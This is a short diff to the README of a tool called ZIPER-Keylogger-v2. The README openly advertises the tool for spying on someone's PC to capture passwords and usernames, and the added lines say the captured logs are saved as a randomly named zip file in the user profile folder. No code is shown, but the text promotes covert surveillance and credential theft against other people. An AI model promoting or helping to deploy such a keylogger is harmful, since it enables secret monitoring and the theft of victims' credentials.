@@ -1,6 +1,9 @@
 # ZIPER-Keylogger-v2
 You want to spy someone PC for Passwords&amp;Usernames etc? Download ZIPER Keylogger-v2 compile it and run it.
 
+</br>
+</br>
+You will find the file with logs '%userprofile%' and you will see zip file with random characters..
 
 
 <br/>
